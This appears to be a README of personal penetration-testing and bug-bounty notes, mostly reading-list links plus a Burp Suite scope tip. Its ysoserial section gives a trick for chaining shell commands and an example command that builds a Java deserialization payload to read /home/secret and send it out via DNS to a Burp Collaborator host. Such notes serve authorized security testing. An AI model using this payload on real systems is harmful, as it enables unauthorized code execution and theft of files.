# EasyG

EasyG started out as a script that I use to automate some information gathering tasks for PenTesting and Bug Hunting. Now it is more than that.

Here I gather all the resources about PenTesting and Bug Bounty Hunting that I find interesting, notes, payloads that I found useful and many links to blogs and articles that I want to read (because having a lot of bookmarks bothered me).

**To Read list**
- https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application
- https://blog.yeswehack.com/yeswerhackers/abusing-s3-bucket-permissions/
- https://portswigger.net/web-security/ssrf
- https://portswigger.net/web-security/jwt
- https://github.com/nahamsec/Resources-for-Beginner-Bug-Bounty-Hunters/blob/master/assets/blogposts.md
- https://github.com/nahamsec/Resources-for-Beginner-Bug-Bounty-Hunters/blob/master/assets/media.md
- https://github.com/nahamsec/Resources-for-Beginner-Bug-Bounty-Hunters/blob/master/assets/mobile.md
- https://www.bugcrowd.com/hackers/bugcrowd-university/
- https://www.microsoft.com/en-us/msrc/bounty-example-report-submission?rtc=1

**Blog / Writeups / News**
- https://pentester.land/list-of-bug-bounty-writeups.html
- https://hackerone.com/hacktivity
- https://portswigger.net/research
- https://www.skeletonscribe.net
- https://cvetrends.com/

**Burp suite**

To add a domain + subdomains in advanced scopes: `.*\.test\.com$`

**Ysoserial**

Because of `Runtime.exec()`, ysoserial doesn't work well with multiple commands. After some research, I found a way to run multiple sys commands anyway, by using `sh -c $@|sh . echo ` before the multiple commands that we need to run. Here's an example:

```
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections7 'sh -c $@|sh . echo host $(cat /home/secret).dctoqqar8fjkhoahnzjvxw9980ev2k.burpcollaborator.net' | gzip | base64
```
